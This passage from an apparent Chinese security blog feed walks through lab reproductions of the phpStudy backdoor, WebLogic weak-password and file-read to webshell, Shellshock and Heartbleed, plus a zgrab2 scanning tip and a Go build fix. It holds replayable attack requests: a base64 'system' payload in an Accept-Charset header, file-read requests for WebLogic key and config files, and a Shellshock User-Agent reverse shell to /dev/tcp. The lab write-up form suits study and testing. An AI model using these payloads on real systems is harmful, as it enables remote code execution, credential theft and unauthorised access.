#扫描出80端口的IP</span><br></pre></td></tr></table></figure><p><strong>得到这些IP网页的源代码</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./zgrab2 -input-file=cn.res --output-file=hk.txt --senders=<span class="number">1000</span> http</span><br></pre></td></tr></table></figure><p><strong>扫完以后筛选</strong></p><p>cat hk.txt | grep “关键词”</p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cannot find package “golang.org/x/crypto/curve25519 解决方法</title>
      <link href="/2019/10/18/cannot%20find%20package%20%E2%80%9Cgolang.org!x!crypto!curve25519%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2019/10/18/cannot%20find%20package%20%E2%80%9Cgolang.org!x!crypto!curve25519%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="cannot-find-package-“golang-org-x-crypto-curve25519-解决方法"><a href="#cannot-find-package-“golang-org-x-crypto-curve25519-解决方法" class="headerlink" title="cannot find package “golang.org/x/crypto/curve25519 解决方法"></a>cannot find package “golang.org/x/crypto/curve25519 解决方法</h1><ol><li></li></ol><h2 id="Linux下安装的时候，当执行最后一步命令“make”的时候-报错如下"><a href="#Linux下安装的时候，当执行最后一步命令“make”的时候-报错如下" class="headerlink" title="Linux下安装的时候，当执行最后一步命令“make”的时候 报错如下"></a>Linux下安装的时候，当执行最后一步命令“make”的时候 报错如下</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">cd cmd/zgrab2 &amp;&amp; go build &amp;&amp; cd ../..</span><br><span class="line">../../lib/ssh/kex.go:<span class="number">22</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/crypto/curve25519"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/crypto/curve25519 (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/crypto/curve25519 (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/ssh/keys.go:<span class="number">28</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/crypto/ed25519"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/crypto/ed25519 (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/crypto/ed25519 (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/smb/ntlmssp/crypto.go:<span class="number">9</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/crypto/md4"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/crypto/md4 (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/crypto/md4 (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/h2_bundle.go:<span class="number">48</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/net/http/httpguts"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/net/http/httpguts (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/net/http/httpguts (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/h2_bundle.go:<span class="number">46</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/net/http2/hpack"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/net/http2/hpack (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/net/http2/hpack (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/h2_bundle.go:<span class="number">47</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/net/idna"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/net/idna (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/net/idna (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../../../sirupsen/logrus/terminal_check_unix.go:<span class="number">6</span>:<span class="number">8</span>: cannot find package <span class="string">"golang.org/x/sys/unix"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/sys/unix (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/sys/unix (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/request.go:<span class="number">30</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/text/unicode/norm"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/text/unicode/norm (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/text/unicode/norm (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/request.go:<span class="number">31</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/text/width"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/text/width (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/text/width (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">make: *** [Makefile:<span class="number">24</span>：zgrab2] 错误 <span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>报错是在<br>cannot find package “golang.org/x/crypto/curve25519”</p><p>由于某些。。原因，国内使用 go get 安装 golang 官方包会失败<br>我们必须手工去github下载这些包了。</p><h2 id="具体解决方法如下："><a href="#具体解决方法如下：" class="headerlink" title="具体解决方法如下："></a>具体解决方法如下：</h2><ol><li>到go的安装目录，替换成自己的即可，如果没有可以创建一个</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/go/bin/src/golang.org/x</span><br></pre></td></tr></table></figure><ol start="2"><li><p>看报错缺什么</p></li><li><p>第一种<br><img src="https://img-blog.csdnimg.cn/20191018112132309.png" alt="在这里插入图片描述"><br><code>git clone https://github.com/golang/crypto.git</code></p></li><li><p>第二种<br><img src="https://img-blog.csdnimg.cn/20191018112820137.png" alt="在这里插入图片描述"></p><p><code>go get gopkg.in/mgo.v2/bson</code></p></li></ol><p>如果还有其它的包，原理同上，只需要直接去“<a href="https://github.com/golang/”这个地址手工克隆下载到本地就可以了。" target="_blank" rel="noopener">https://github.com/golang/”这个地址手工克隆下载到本地就可以了。</a></p>]]></content>
      
      
      <categories>
          
          <category> 配环境go环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】PHPstudy后门利用</title>
      <link href="/2019/09/29/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91PHPstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/"/>
      <url>/2019/09/29/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91PHPstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】PHPstudy后门利用"><a href="#【研究】PHPstudy后门利用" class="headerlink" title="【研究】PHPstudy后门利用"></a>【研究】PHPstudy后门利用</h3><ul><li><ul><li><a href="#1_2">1.环境</a></li><li><a href="#2_9">2.原理</a></li><li><a href="#3_12">3.影响版本</a></li><li><a href="#4_21">4.后门检测</a></li><li><a href="#5_39">5.漏洞利用</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>测试的是这两个版本<br>phpStudy_2016.11.03 后门版<br>PhpStudy20180211 后门版</p><p>PhpStudy软件对于国内众多开发者而言，并不陌生。它是一款免费的PHP调试环境的程序集成包，集成了最新的Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer多款软件一次性安装，无需配置即可直接使用，具有PHP环境调试和PHP开发功能。因为免费公益、简易方便，现已发展到一定的规模，有着近百万PHP语言学习者、开发者用户。</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>程序包自带PHP的php_xmlrpc.dll模块隐藏有后门</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>phpStudy20161103版本：</p><p>php5.4.45与php5.2.17</p><p>phpStudy20180211版本：</p><p>php5.4.45与php5.2.17</p><h2 id="4-后门检测"><a href="#4-后门检测" class="headerlink" title="4.后门检测"></a>4.后门检测</h2><p>下载对应版本，启动对应版本</p><p>检查一下后门文件有没有<br>位置：</p><blockquote><p>xxxx\phpstudy\PHPTutorial\php\php-5.2.17\ext<br>我用的是这个版本<br>xxxx\phpstudy\PHPTutorial\php\php-5.4.45\ext<br>找到目录下的php_xmlrpc.dll文件<br><img src="https://img-blog.csdnimg.cn/20190929104050280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开搜索eval关键字：<br><img src="https://img-blog.csdnimg.cn/20190929104300624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这就算是存在</p></blockquote><h2 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h2><p>然后随便访问一个php文件<br>抓包改掉请求头字段：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accept-Encoding中逗号后面的空格要去掉</span><br><span class="line">Accept-Charset为system('ipconfig')的base64编码</span><br></pre></td></tr></table></figure><p>改完</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accept-Encoding:gzip,deflate</span><br><span class="line">Accept-Charset:c3lzdGVtKCdpcGNvbmZpZycpOw==</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190929105541822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>包</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">10.77</span><span class="number">.0</span><span class="number">.100</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.1</span>; Win64; x64; rv:<span class="number">69.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">69.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">accept-Encoding:gzip,deflate</span></span><br><span class="line"><span class="comment">Accept-Charset:c3lzdGVtKCdpcGNvbmZpZycpOw==</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>weblogic漏洞系列- 弱口令</title>
      <link href="/2019/09/05/weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-%20%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
      <url>/2019/09/05/weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-%20%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】weblogic漏洞系列-弱口令和解密"><a href="#【研究】weblogic漏洞系列-弱口令和解密" class="headerlink" title="【研究】weblogic漏洞系列- 弱口令和解密"></a>【研究】weblogic漏洞系列- 弱口令和解密</h3><ul><li><ul><li><a href="#1_2">1.环境</a></li><li><a href="#2_17">2.原理</a></li><li><a href="#3_21">3.影响版本</a></li><li><a href="#4_25">4.利用过程</a></li><li><a href="#_38">任意文件读取漏洞的利用</a></li></ul></li><li><a href="#webshell_60">webshell</a></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>Weblogic版本：10.3.6(11g)</p><p>Java版本：1.6</p><p>本环境模拟了一个真实的weblogic环境，其后台存在一个弱口令，并且前台存在任意文件读取漏洞。分别通过这两种漏洞，模拟对weblogic场景的渗透。</p><p>环境启动后，weblogic后台访问<a href="http://ip:7001/console" target="_blank" rel="noopener">http://ip:7001/console</a></p><p>本环境存在弱口令：</p><p>weblogic<br>Oracle@123</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Weblogic版本：10.3.6(11g)</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境启动后，weblogic后台访问<a href="http://ip:7001/console" target="_blank" rel="noopener">http://ip:7001/console</a></p><p>本环境存在弱口令：</p><p>weblogic<br>Oracle@123<br><img src="https://img-blog.csdnimg.cn/20190905153043964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登录进来<br><img src="https://img-blog.csdnimg.cn/20190905153107931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="任意文件读取漏洞的利用"><a href="#任意文件读取漏洞的利用" class="headerlink" title="任意文件读取漏洞的利用"></a>任意文件读取漏洞的利用</h2><p>假设不存在弱口令，如何对weblogic进行渗透？</p><p>环境前台模拟了一个任意文件下载漏洞，访问<a href="http://IP:7001/hello/file.jsp\?path=/etc/passwd可见成功读取passwd文件。" target="_blank" rel="noopener">http://IP:7001/hello/file.jsp\?path=/etc/passwd可见成功读取passwd文件。</a><br><img src="https://img-blog.csdnimg.cn/20190905160038980.png" alt="在这里插入图片描述"></p><p>读取后台用户密文与密钥文件<br>weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml（基于当前目录/root/Oracle/Middleware/user_projects/domains/base_domain）。</p><p>SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件：<br>GET /hello/file.jsp?path=./security/SerializedSystemIni.dat<br><img src="https://img-blog.csdnimg.cn/20190905160358606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190905160609254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>复制出来<br>再访问<br>GET /hello/file.jsp?path=./config/config.xml<br><img src="https://img-blog.csdnimg.cn/20190905161437515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后解密<br><img src="https://img-blog.csdnimg.cn/20190905161639181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解密</p><h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><p><strong>获取到管理员密码后，登录后台。点击左侧的部署，可见一个应用列表：</strong></p><p>可以直接webshell</p><p><img src="https://img-blog.csdnimg.cn/20190905153301650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击安装<br><img src="https://img-blog.csdnimg.cn/20190905153440113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>出现上传点<br><img src="https://img-blog.csdnimg.cn/20190905153457920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p><code>上传war包。值得注意的是，我们平时tomcat用的war包不一定能够成功，你可以将你的webshell放到本项目的web/hello.war这个压缩包中，再上传。上传成功后点下一步。</code></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190905154306544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续一直下一步，最后点完成。</p><p><img src="https://img-blog.csdnimg.cn/20190905154611756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后路径为 <a href="http://10.77.0.130:7001//zydx666godz/godz.jsp\?o=vLogin" target="_blank" rel="noopener">http://10.77.0.130:7001//zydx666godz/godz.jsp\?o=vLogin</a><br><img src="https://img-blog.csdnimg.cn/20190905154638215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190905155114480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】Shellshock 破壳漏洞bash命令执行（CVE-2014-6271）</title>
      <link href="/2019/09/03/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ebash%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2014-6271%EF%BC%89/"/>
      <url>/2019/09/03/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ebash%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2014-6271%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】Shellshock-破壳漏洞（CVE-2014-6271）"><a href="#【研究】Shellshock-破壳漏洞（CVE-2014-6271）" class="headerlink" title="【研究】Shellshock 破壳漏洞（CVE-2014-6271）"></a>【研究】Shellshock 破壳漏洞（CVE-2014-6271）</h3><ul><li><ul><li><a href="#1_3">1.环境</a></li><li><a href="#2_8">2.原理</a></li><li><a href="#3_11">3.影响版本</a></li><li><a href="#4_13">4.利用过程</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>目前的Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>GNU Bash &lt;= 4.3</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>有两个页面<code>http://10.77.0.130:8080/victim.cgi</code>和<code>http://10.77.0.130:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。<br><img src="https://img-blog.csdnimg.cn/20190903153139661.png" alt="在这里插入图片描述"></p><p>操作：<br>访问 <a href="http://10.77.0.130:8080/victim.cgi，通过" target="_blank" rel="noopener">http://10.77.0.130:8080/victim.cgi，通过</a> Burp 截包，修改 HTTP 请求头中 UA 字段：</p><p>命令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: () &#123; :;&#125;;echo ; echo; echo $(&#x2F;bin&#x2F;ls -al &#x2F;); #列出bin目录下所有文件</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190903155958866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>反弹 Shell 到 ip 8888端口:<br>User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1;</p><p>完整的请求报文如下(可直接复制到 Burp 下重放)：</p><p>GET /victim.cgi HTTP/1.1<br>Host: 10.77.0.130:8080<br>User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.77.0.58/666 0&gt;&amp;1;<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0</p><p><img src="https://img-blog.csdnimg.cn/201909041135113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>任意密码重置总结导图</title>
      <link href="/2019/08/28/%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%80%BB%E7%BB%93%E5%AF%BC%E5%9B%BE/"/>
      <url>/2019/08/28/%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%80%BB%E7%BB%93%E5%AF%BC%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="任意密码重置总结导图"><a href="#任意密码重置总结导图" class="headerlink" title="任意密码重置总结导图"></a>任意密码重置总结导图</h2><p><img src="https://img-blog.csdnimg.cn/20190828181509356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】心脏出血漏洞</title>
      <link href="/2019/08/28/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/08/28/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】"><a href="#【研究】" class="headerlink" title="【研究】"></a>【研究】</h3><ul><li><ul><li><a href="#1_3">1.环境</a></li><li><a href="#2_8">2.原理</a></li><li><a href="#3_13">3.影响版本</a></li><li><a href="#4_19">4.利用过程</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>2014年4月7日OpenSSL发布了安全公告，在OpenSSL1.0.1版本的心跳包模块存在严重漏洞（CVE-2014-0160）。攻击者可以通过构造特殊的数据包，直接远程读取存在漏洞的OpenSSL服务器内存中多达64KB的数据，极有可能导致网站用户帐号密码等敏感数据被非法获取。漏洞发现者甚至声称可以直接获取到证书私钥和重要的商业文档。</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>OpenSSL 1.0.1f（受影响）<br>OpenSSL 1.0.1g （不受影响）<br>OpenSSL 1.0.0 branch （不受影响）<br>OpenSSL 0.9.8 branch （不受影响）</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p><a href="http://0day.websaas.com.cn/" target="_blank" rel="noopener">http://0day.websaas.com.cn/</a><br>简单的可以直接在线检测</p><p><img src="https://img-blog.csdnimg.cn/20190828161833626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>测试脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 